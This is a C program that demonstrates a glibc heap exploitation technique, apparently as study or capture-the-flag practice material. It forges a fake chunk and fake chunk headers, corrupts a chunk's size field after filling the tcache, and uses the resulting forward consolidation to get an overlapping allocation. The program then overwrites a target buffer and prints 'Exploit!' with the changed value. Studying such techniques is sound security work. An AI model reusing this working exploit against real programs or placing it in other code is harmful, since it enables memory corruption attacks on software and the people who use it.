#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "malloc_struct.h"

int main(void){
	void *ma, *mb;
	malloc_chunk *ca;
	unsigned long *target, *victim;

	ma = malloc(0xa8);		// A
	ca = mem2chunk(ma);
	target = malloc(0x18);
	mb = malloc(0x18);

	for(int i=0; i<7; i++)
		free(calloc(1, 0x88));

	target[0] = 0xdeadbeef;
	printf("target  = %p\n*target = %#lx\n\n"
		, target, *target);

	malloc_chunk *cp = ma + 0x80;	// P
	cp->size = 0x51;
	cp->fd = cp->bk = cp;

	((malloc_chunk*)mb)->prev_size = 0x50;
	((malloc_chunk*)mb)->size = 0x10;

	ca->size = 0x91; 		// vuln
	free(ma); 			// trigger consolidate forward

	puts("Exploit!");
	victim = malloc(0xd8);		// overwrap target
	memset(victim, 'A', 0xd8);

	printf("victim  = %p (%#zx byte)\n*target = %#lx\n"
	, victim, (mem2chunk(victim)->size)&~7, *target);
}
